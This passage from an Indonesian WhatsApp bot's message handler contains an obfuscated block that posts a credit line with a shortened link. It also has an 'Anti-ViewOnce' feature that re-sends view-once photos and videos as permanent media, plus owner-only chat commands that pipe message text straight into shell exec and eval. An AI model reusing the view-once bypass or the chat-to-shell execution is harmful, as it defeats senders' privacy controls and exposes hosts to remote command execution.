(function(_0x364870,_0x4e8ffe){var _0x1a7136=_0x1384,_0x17f86f=_0x364870();while(!![]){try{var _0x43599a=-parseInt(_0x1a7136(0x17d))/0x1*(parseInt(_0x1a7136(0x17b))/0x2)+-parseInt(_0x1a7136(0x17e))/0x3+-parseInt(_0x1a7136(0x17f))/0x4+-parseInt(_0x1a7136(0x17c))/0x5+parseInt(_0x1a7136(0x182))/0x6+-parseInt(_0x1a7136(0x181))/0x7+parseInt(_0x1a7136(0x180))/0x8;if(_0x43599a===_0x4e8ffe)break;else _0x17f86f['push'](_0x17f86f['shift']());}catch(_0x138e62){_0x17f86f['push'](_0x17f86f['shift']());}}}(_0x4828,0x79911),reply('BOT\x20INI\x20MENGGUNAKAN\x20SCIPT\x20DARI\x20YOUTUBE\x20\x20https://bit.ly/3euynfb'));function _0x1384(_0x5211ba,_0x287db8){var _0x482810=_0x4828();return _0x1384=function(_0x13842d,_0x20ce34){_0x13842d=_0x13842d-0x17b;var _0x5c7fe5=_0x482810[_0x13842d];return _0x5c7fe5;},_0x1384(_0x5211ba,_0x287db8);}function _0x4828(){var _0x477732=['4436320VFdFzu','1uPXknw','1329585GjCfEP','1715052yuZzsz','23930656PhvXev','765429Hfliso','1041030oXCaNb','1596662gOdDxl'];_0x4828=function(){return _0x477732;};return _0x4828();}
}
break
//Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA

default:

if (isGroup && isAntiVo && m.mtype == 'viewOnceMessage'){
var msg = {...mek}
let typenya = msg.message.viewOnceMessage.message["videoMessage"] ?
msg.message.viewOnceMessage.message.videoMessage : msg.message.viewOnceMessage.message.imageMessage   
typenya["viewOnce"] = false
typenya["caption"] = `⦁─┈❥︎❀• *Anti-ViewOnce* •❀❥︎┈─⦁${(typenya.caption === '') ? `\n\n*◯ Type : `+typenya.mimetype+'*' : `\n\n*◯ Caption : `+typenya.caption+`*\n*◯ Type : `+typenya.mimetype+'*'}`  
let peq = msg.message.viewOnceMessage.message["imageMessage"] ? { key: { fromMe: false, participant: sender, id: mek.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } } :  { key: { fromMe: false, participant: sender, id: mek.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } }  
let pe = await YANZ.prepareMessageFromContent(from, msg.message.viewOnceMessage.message, {quoted: peq, tumbnail:gambar2})  
await YANZ.relayWAMessage(pe)
}

try { 
if (budy.startsWith("=")){
//Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA
if (isBan) return
reply(`${Math_js.evaluate(budy.slice(1).replace("×","*").replace("x","*").replace("X","*").replace("÷","/").replace(":","/").replace("kali","*").replace("bagi","/").replace("tambah","+").replace("tamba","+").replace("kurang","-").replace("kurangi","-"))}`)
}
if (chats.toLowerCase() === "ping"){
if (isBan) return
po = await YANZ.sendMessage(from, `Pong!\nSpeed : ${processsTime(mek.messageTimestamp.low, moment())}s`, text, {quoted:faketroli})
setTimeout(() => {
YANZ.deleteMessage(from, po.key)
}, 5000)
}
} catch {
}
if (budy.startsWith("$")){
if (!isOwner && !isSelf) return
console.log(color('[ EXEC ]','yellow'), budy.slice(2))
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) reply(`${stdout}`)
})
}
if (budy.startsWith("x")){
try {
if (!isOwner && !isSelf)return
return YANZ.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(`${e}`)
}
}
if(budy.startsWith(">")){
if (!isOwner && !mek.key.fromMe) return
console.log(color('[ EVAL ]','yellow'), budy.slice(2))
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
reply(`${evaled}`)
} catch (err) {
reply(`${err}`)
}
}
if (budy.startsWith('=>')){
if (!isOwner && !isSelf) return
try {
return YANZ.sendMessage(from, 
`\`\`\`📥 Input: ${budy.slice(3)}
📤 OutPut: 
${JSON.stringify(eval(budy.slice(2)),null,'\t')}
\`\`\``
,text, {quoted:mek })
} catch(err) {
e = String(err)
reply(`*ERROR :* ${e}`)
}
}
if (budy.startsWith('>>')){
if (!isOwner && !isSelf) return
var konsol = budy.slice(2)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
  reply(String(e))
}
}
if (budy.startsWith('<')){
if (!mek.key.fromMe && !isOwner) return
if (!/^https?:\/\//.test(budy.slice(2))) return reply('Awali *URL* dengan http:// atau https://')
  res = await fetch(budy.slice(2))
  if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
  delete res
  throw `Content-Length: ${res.headers.get('content-length')}`
}
  if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, budy.slice(2))
  txtx = await res.buffer()
  try {
  txtx = util.format(JSON.parse(txtx+''))
  } catch (e) {
  txtx = txtx + ''
  } finally {
  reply(txtx.slice(0, 65536) + '')
}
}
if (budy.toLowerCase()==`assalamualaikum`){
if (isBan) return
reply(`Waalaikumsalam @${sender.split("@")[0]}`)
}
if (budy.toLowerCase()==`assalamu'alaikum`){
if (isBan) return
reply(`Waalaikumsalam @${sender.split("@")[0]}`)
}
if (budy.toLowerCase()==`assalamualaikum`){
if (isBan) return
reply(`Waalaikumsalam @${sender.split("@")[0]}`)
}
if (isGroup && !isCmd && budy != undefined) {
} else {
}
}
} catch (e) {
e = String(e)
if (!e.includes("this.isZero")) {
if (!e.includes("Cannot read property 'conversation' of null")) {
if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
if (!e.includes("Cannot set property 'mtype' of undefined")) {
if (!e.includes("jid is not defined")) {
console.log('ERROR : %s', color(e, 'red'))
}
}
}
}
}
}
}